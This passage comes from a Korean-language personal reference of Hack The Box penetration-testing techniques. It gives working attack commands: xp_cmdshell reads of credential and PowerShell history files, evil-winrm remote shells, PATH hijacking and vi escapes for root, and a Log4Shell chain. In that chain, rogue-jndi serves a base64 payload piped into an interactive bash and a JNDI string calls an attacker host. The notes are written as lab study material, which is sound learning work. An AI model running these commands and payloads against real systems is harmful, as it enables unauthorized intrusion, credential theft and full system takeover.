EXEC xp_cmdshell 'findstr /i "pass cred history auto consolehost" C:\Users\sql_svc\Desktop\peas.txt';
```

- `findstr /i`: 대소문자 무시 문자열 검색

실습 중에는 이 흐름으로 `ConsoleHost_history.txt` 경로를 빠르게 찾았음

`findstr` 결과에서는 전체 파일을 다 읽기보다 `pass`, `cred`, `history`, `consolehost` 같은 줄만 남김. 이렇게 해야 대용량 결과에서 실제 자격증명 후보를 빠르게 추릴 수 있음

### `ConsoleHost_history.txt`

PowerShell 명령 기록 파일임. 관리자나 서비스 계정이 과거에 실행한 명령이 그대로 남아 있을 수 있음

```sql
EXEC xp_cmdshell 'type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt';
```

- `type`: Windows에서 파일 내용 출력

실습 중에는 여기서 네트워크 공유 접근 명령과 관리자 자격증명이 확인됐음

이 파일은 보통 `net use`, `runas`, `powershell`, 백업 스크립트 명령이 그대로 남아 있을 수 있음. 단순 기록 파일처럼 보여도 실제로는 가장 직접적인 자격증명 단서가 되기 쉬움

### `evil-winrm`

WinRM 포트가 열려 있고 자격증명을 확보했으면 가장 깔끔하게 원격 셸을 얻음

```bash
evil-winrm -i <TARGET_IP> -u administrator -p '<PASSWORD>'
```

- `-i`: 대상 IP
- `-u`: 사용자명
- `-p`: 비밀번호

셸 해석 방지: 작은따옴표

성공하면 `*Evil-WinRM* PS C:\Users\...>` 같은 PowerShell 프롬프트가 열림. 이 프롬프트가 뜨면 이후에는 원격 파일 탐색, `type`, `dir`, `whoami` 같은 작업을 일반 셸처럼 이어갈 수 있음

## 11. Linux 권한 상승

### `find`

리눅스 권한 상승에서는 `이상한 권한의 파일`을 찾는 게 기본임

#### 특정 그룹 소유 파일 찾기

```bash
find / -group bugtracker 2>/dev/null
```

- `/`: 루트부터 전체 검색
- `-group bugtracker`: 그룹명이 `bugtracker`인 파일만
- `2>/dev/null`: 오류 출력 숨김

실습 중에는 여기서 `/usr/bin/bugtracker`를 찾았음

즉 결과에서 가장 먼저 볼 것은 `비정상적으로 눈에 띄는 바이너리 경로`임. 그룹명 자체가 서비스명이나 내부 기능명을 가리키면, 그 바이너리가 권한 상승 후보일 가능성이 높음

#### SUID 파일 전반 확인 예시

```bash
find / -perm -4000 -type f 2>/dev/null
```

- `-perm -4000`: SUID 비트가 켜진 파일
- `-type f`: 일반 파일만

결과가 많을 수 있으므로, 기본 시스템 유틸리티보다 생소한 이름이나 커스텀 경로의 바이너리를 먼저 봄

### `PATH` Hijacking

SUID 바이너리가 `cat`, `tar`, `cp` 같은 명령을 절대 경로 없이 호출 시 `PATH` 조작이 가능함

#### 현재 PATH 확인

```bash
echo $PATH
```

#### 공격용 디렉터리를 앞에 추가

```bash
export PATH=/tmp:$PATH
```

- `export`: 현재 셸 환경 변수 반영
- `/tmp:$PATH`: 기존 PATH보다 `/tmp`를 먼저 보게 만듦

`echo $PATH` 결과는 단순 확인처럼 보이지만, 실제로는 `내가 만든 가짜 실행 파일이 먼저 호출될 수 있는지`를 판단하는 기준임

#### 가짜 `cat` 만들기

```bash
cd /tmp
echo "/bin/sh" > cat
chmod +x cat
```

이후 취약한 SUID 프로그램이 `cat`을 호출 시 `/usr/bin/cat`이 아니라 `/tmp/cat`을 먼저 실행하고, 결국 root 권한 셸로 이어질 수 있음

이 공격이 성립하려면 바이너리 내부가 `cat`을 절대 경로 없이 호출해야 함. 따라서 실행 전후 출력 차이와 셸 획득 여부를 같이 확인해야 함

핵심 판단 기준은 아래와 같음

- SUID 비트가 켜져 있는가
- 내부에서 공용 명령을 `절대 경로 없이` 부르는가
- PATH 순서를 공격자가 조작할 수 있는가

### `sudo -l`

일반 사용자 셸을 얻은 뒤에는 항상 `sudo -l`을 확인함

```bash
sudo -l
```

실습 중에는 특정 사용자에게 아래처럼 제한된 명령이 허용되어 있었음

```text
(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

의미: `vi` 단독 root 실행 가능

이 출력에서 가장 중요한 것은 `NOPASSWD` 여부보다 `어떤 프로그램을 어떤 경로에서 root로 실행할 수 있는가`임. `vi`, `less`, `man`, `find`, `tar`처럼 탈출이 가능한 프로그램이면 바로 권한 상승 후보가 됨

### `vi` shell escape

```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

`vi` 안에서:

```vim
:!id
:!ls /root
:!cat /root/root.txt
```

- `:!<명령>`: `vi` 안에서 외부 셸 명령 실행

즉 `sudo`가 허용한 프로그램이 곧 탈출 지점

여기서는 `:!id`로 현재 권한을 먼저 확인하고, 이후 필요한 파일만 최소한으로 읽는 편이 정리도 쉽고 흐름도 명확함

## 12. Log4Shell / JNDI / LDAP 계열 콜백 검증

### `metasploit`

실제 익스플로잇보다 먼저 `무슨 취약점인지`, `어떤 포트를 쓰는지`, `필수 조건이 무엇인지`를 읽는 용도로 유용했음

```bash
msfconsole
search unifi network
use exploit/multi/http/ubiquiti_unifi_log4shell
info
```

이 단계에서 확인할 포인트는 아래와 같음

- 영향받는 버전
- 취약 필드
- 필요한 포트
- 필요한 콜백 서버 종류

`info` 출력은 길지만, 실제로는 `Description`, `RPORT`, `SRVPORT`, `TARGETURI` 같은 핵심 정보만 먼저 읽어도 공격 흐름을 이해할 수 있음

### `tcpdump`

LDAP 콜백이 실제로 들어오는지 보기 위해 사용했음

```bash
tcpdump -i tun0 port 389
```

- `-i tun0`: 캡처 인터페이스 지정
- `port 389`: LDAP 포트만 필터링

즉 `공격 성공 여부를 화면이 아니라 네트워크 트래픽으로 검증`하는 단계임

성공하면 `IP TARGET_IP.random_port > ATTACKER_IP.389` 같은 패킷 로그가 뜸. 여기서 중요한 것은 `누가 누구에게 LDAP 연결을 시도했는가`임

### `rogue-jndi`

JNDI / LDAP 기반 콜백 서버를 띄우는 데 사용했음

#### 준비

```bash
sudo apt update
sudo apt install openjdk-11-jdk -y
sudo apt install maven -y
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
mvn package
```

#### 공격 서버 실행

```bash
java -jar target/RogueJndi-1.1.jar \
  --command "bash -c {echo,<BASE64_PAYLOAD>}|{base64,-d}|{bash,-i}" \
  --hostname "<ATTACKER_IP>"
```

- `--command`: 대상이 최종 실행할 명령
- `--hostname`: 공격자 서버 주소

실습 중에는 `LDAP server`, `HTTP server`, `netcat listener`가 한 흐름으로 이어졌음

정상 실행되면 `Starting HTTP server on 0.0.0.0:8000`, `Starting LDAP server on 0.0.0.0:1389`, `Mapping ldap://...` 같은 문장이 보임. 즉 서버가 제대로 떴는지부터 먼저 확인해야 함

### JNDI 페이로드 예시

```text
${jndi:ldap://<ATTACKER_IP>:1389/o=tomcat}
```

이 문자열이 취약한 필드에 전달되면, 서버가 LDAP 조회를 시도하고 그 시점에 `tcpdump`와 `rogue-jndi`에서 콜백이 관측됨

결국 이 단계의 성공 기준은 애플리케이션 화면보다 `콜백 발생 여부`임. 화면에 변화가 없어도 LDAP 요청이 찍히면 취약 지점 확인으로는 충분한 단서가 됨

## 13. 단서별로 바로 떠올린 도구

### `445/tcp`와 사용자 공유가 보일 때

- `smbclient -N -L //<TARGET_IP>/`
- 공유 안에 설정 파일이 있으면 `get`
- 연결 문자열, 계정명, 평문 비밀번호가 있는지 확인

### `21/tcp`와 `anonymous`가 보일 때

- `ftp <TARGET_IP>`
- `ls`, `get backup.zip`
- `zip2john -> john -> unzip -> 소스코드 확인`

### 로그인 페이지에서 작은따옴표 하나로 SQL 오류가 날 때

- Burp로 요청 저장
- `sqlmap -r burp_req.txt --batch`
- 이후 `-p`, `--dbms`, `--dbs`, `--dump`, `--os-shell` 순서로 확대

### 업로드 기능이 열려 있고 `/uploads`가 의심될 때

- Burp로 업로드 요청 확인
- 업로드 후 `gobuster` 또는 직접 접근으로 경로 확인
- `nc -lvnp <PORT>` 대기
- 웹쉘 또는 리버스 쉘 호출

### `1433/tcp`와 MSSQL 계정이 확보됐을 때

- `impacket-mssqlclient ... -windows-auth`
- `enable_xp_cmdshell`
- `xp_cmdshell whoami`
- PowerShell로 도구 전달

### `5985/tcp`가 열려 있고 관리자 자격증명이 있을 때

- `evil-winrm -i <TARGET_IP> -u administrator -p '<PASSWORD>'`

### `sudo -l`에서 `vi`가 보일 때

- `sudo /bin/vi <허용 파일>`
- `:!id`, `:!cat /root/root.txt`

### SUID 프로그램이 `cat` 같은 명령을 절대 경로 없이 부를 때

- `echo $PATH`
- `export PATH=/tmp:$PATH`
- 가짜 실행 파일 생성 후 권한 상승 시도

### 애플리케이션 내부 MongoDB가 비표준 포트를 쓸 때

- `ps -ef | grep mongo`
- `mongo --port <PORT>`
- `show dbs`, `use ace`, `db.admin.find()`

## 정리

HTB를 여러 문제 풀다 보면 결국 중요한 것은 `명령어 암기`보다 `단서에 맞는 도구를 고르는 순서`라는 점을 더 자주 느끼게 됨

여러 박스를 묶어보면 특히 반복된 축은 아래와 같음

- `nmap`으로 서비스 역할을 좁히는 단계
- `smbclient`, `ftp`, `gobuster`, `ffuf`로 공개 표면을 벗겨내는 단계
- `Burp`, `sqlmap`, `mssqlclient`, `mongo`로 애플리케이션과 DB를 파고드는 단계
- `nc`, `python pty`, `script`, `evil-winrm`으로 셸을 안정화하는 단계
- `winPEAS`, `find`, `sudo -l`, `PATH hijack`으로 최종 권한 상승을 마무리하는 단계

즉 Hack The Box의 가치는 문제별 정답을 외우는 데 있지 않고, `표면 분석에서 root까지 이어지는 반복 패턴을 몸에 익히는 것`에 더 가까움. 이 글도 그 흐름을 다시 보기 위한 개인용 사전이자, 이후 실습을 더 빠르게 정리하기 위한 기준 문서로 남겨둠

